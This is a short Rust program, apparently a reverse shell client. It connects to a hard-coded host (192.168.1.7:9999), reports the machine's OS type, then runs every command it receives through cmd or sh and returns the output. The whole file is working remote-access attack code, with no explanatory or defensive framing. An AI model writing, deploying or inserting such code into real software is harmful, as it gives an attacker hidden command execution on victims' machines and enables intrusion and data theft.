use std::net::{TcpStream};
use std::io::{prelude::*};
use std::process::Command;
use sys_info::os_type;


fn get_os() -> String {
    match sys_info::os_type() {
        Ok(os) => return os,
        Err(e) => return e.to_string(),
    }
}


fn execute_command(execute: &str) -> Vec<u8> {
    
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", execute])
            .output()
            .expect("failed to execute process")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(execute)
            .output()
            .expect("failed to execute process")
    };



    let bytes: Vec<u8> = output.stdout;
    bytes
}

fn handle_connection(mut stream: TcpStream){
    
    let os = get_os();
    let bytes: Vec<u8> = os.bytes().collect();
    let _ = stream.write(&bytes);

    loop {
        let mut buffer = [0 as u8; 4096];
        let received = stream.read(&mut buffer).unwrap(); 
        let received = String::from_utf8_lossy(&buffer[..received]);
        let received = received.trim_end();
        
        let command: &str = received;
        let message = execute_command(command); 
        let _ = stream.write(&message);
    }
}

fn main(){

    if let Ok(stream) = TcpStream::connect("192.168.1.7:9999") {
        handle_connection(stream);
    } else {
        println!("Couldn't connect to server...");
    }
}
